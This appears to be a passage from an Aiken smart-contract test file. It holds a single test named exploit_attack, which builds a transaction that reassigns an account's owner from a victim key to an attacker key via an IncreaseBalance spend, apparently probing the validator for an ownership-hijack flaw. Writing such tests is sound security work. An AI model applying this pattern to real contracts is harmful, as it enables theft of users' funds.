}


test exploit_attack() {
  let victim_key = #"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
  let attacker_key = #"cafebabecafebabecafebabecafebabecafebabecafebabecafebabe"
  let account_script_hash = #"1234567890abcdef1234567890abcdef1234567890abcdef123456"
  let input_ref = ref(0)
  let input_datum = AccountDatum { balance: 1000, owner: victim_key }
  let input_address = script_addr(account_script_hash)
  let input_utxo = utxo(input_ref, input_address, 1000, input_datum)
  let output_datum = AccountDatum { balance: 1000, owner: attacker_key }
  let output_address = script_addr(account_script_hash)
  let output = Output { address: output_address, value: assets.from_lovelace(1000), datum: InlineDatum(output_datum), reference_script: None }
  let tx = tx_with([input_utxo], [output], [])
  account.spend(Some(input_datum), IncreaseBalance, input_ref, tx)
}

